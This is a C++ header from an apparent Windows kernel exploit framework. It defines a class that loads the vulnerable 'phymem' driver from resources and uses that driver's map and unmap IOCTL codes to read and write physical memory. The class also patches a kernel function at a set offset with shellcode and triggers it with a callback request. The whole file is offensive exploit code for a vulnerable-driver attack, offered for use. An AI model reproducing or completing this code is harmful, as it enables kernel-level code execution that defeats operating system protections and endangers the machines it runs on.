#pragma once
#include <Windows.h>
#include <cstdint>
#include <dolboeb_executor.hpp>
#include "resources/phymemx.hpp"

#pragma comment(lib, "lib-dolboeb-executor.lib")


namespace exploit {
	struct control_ctx_t {
		uint64_t m_size;
		uint64_t m_physical_address;
		uint64_t m_section_handle;
		uint64_t m_user_address;
		uint64_t m_section_object;
	};

	enum class e_control_code : DWORD {
		map = 0x80102040,
		unmap = 0x80102044
	};

	class c_phymem : public dolboeb::i_exploit {
	public:
		c_phymem( ) = default;
		~c_phymem( ) = default;

	public:
		//
		// Get drv name, "phymem" for example
		const char* get_name( ) override;
		//
		// Reads physical memory
		bool read_phys( const uint64_t phys_addr, uint8_t* buffer, const uint64_t size ) override;
		//
		// Writes to physical memory
		bool write_phys( const uint64_t phys_addr, uint8_t* buffer, const uint64_t size ) override;
		//
		// Sends IoCtlCode that will execute our patched function
		bool send_callback_request( void* shell_executor_addr ) override;
		//
		// Setting up driver, like dropping it from resources and loading
		bool setup_driver( ) override;
		//
		// Initing device handle ( m_device_handle )
		bool init_device_handle( ) override;
		//
		// Unloads loaded driver
		bool unload_driver( ) override;
		//
		// Returns the static rva to function that we'll patch to our shellcode
		uint64_t target_function_rva( ) override;

		__forceinline bool control( control_ctx_t& control_io, e_control_code ctl_code ) {
			DWORD ret_sz;
			return DeviceIoControl( get_device_handle( ), static_cast< DWORD >( ctl_code ), &control_io, sizeof( control_ctx_t ), &control_io, sizeof( control_ctx_t ), &ret_sz, 0 );
		}
	};
}
